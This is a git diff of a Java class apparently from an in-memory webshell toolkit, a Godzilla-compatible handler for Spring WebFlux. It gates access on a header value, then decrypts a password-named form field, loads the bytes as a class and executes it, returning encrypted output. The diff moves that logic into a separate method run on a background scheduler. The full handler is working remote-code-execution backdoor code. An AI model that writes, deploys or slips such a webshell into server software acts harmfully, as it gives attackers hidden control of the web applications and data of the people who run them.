@@ -1,8 +1,10 @@
 package com.reajason.javaweb.memshell.shelltool.godzilla;
 
 import org.springframework.http.ResponseEntity;
+import org.springframework.util.MultiValueMap;
 import org.springframework.web.server.ServerWebExchange;
 import reactor.core.publisher.Mono;
+import reactor.core.scheduler.Schedulers;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -33,31 +35,35 @@ public class GodzillaHandlerMethod extends ClassLoader {
         if (value == null || !value.contains(headerValue)) {
             return ResponseEntity.notFound().build();
         }
-        Object bufferStream = exchange.getFormData().flatMap(map -> {
-            StringBuilder result = new StringBuilder();
-            try {
-                byte[] data = base64Decode(map.getFirst(pass));
-                data = x(data, false);
-                if (payload == null) {
-                    payload = new GodzillaHandlerMethod(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
-                } else {
-                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = payload.getDeclaredConstructor().newInstance();
-                    f.equals(arrOut);
-                    f.equals(data);
-                    f.equals(exchange.getRequest());
-                    f.toString();
-                    result.append(md5.substring(0, 16));
-                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
-                    result.append(md5.substring(16));
-                }
-            } catch (Throwable ex) {
-                ex.printStackTrace();
-                result.append(getErrorMessage(ex));
-            }
-            return Mono.just(result.toString());
-        });
+        Mono<String> bufferStream = exchange.getFormData()
+                .flatMap(map -> Mono.fromCallable(() -> process(map, exchange))
+                        .subscribeOn(Schedulers.boundedElastic()));
         return ResponseEntity.ok(bufferStream);
+    }
+
+    private String process(MultiValueMap<String, String> map, ServerWebExchange exchange) {
+        StringBuilder result = new StringBuilder();
+        try {
+            byte[] data = base64Decode(map.getFirst(pass));
+            data = x(data, false);
+            if (payload == null) {
+                payload = new GodzillaHandlerMethod(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
+            } else {
+                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                Object f = payload.getDeclaredConstructor().newInstance();
+                f.equals(arrOut);
+                f.equals(data);
+                f.equals(exchange.getRequest());
+                f.toString();
+                result.append(md5.substring(0, 16));
+                result.append(base64Encode(x(arrOut.toByteArray(), true)));
+                result.append(md5.substring(16));
+            }
+        } catch (Throwable ex) {
+            ex.printStackTrace();
+            result.append(getErrorMessage(ex));
+        }
+        return result.toString();
     }
 
     @SuppressWarnings("all")
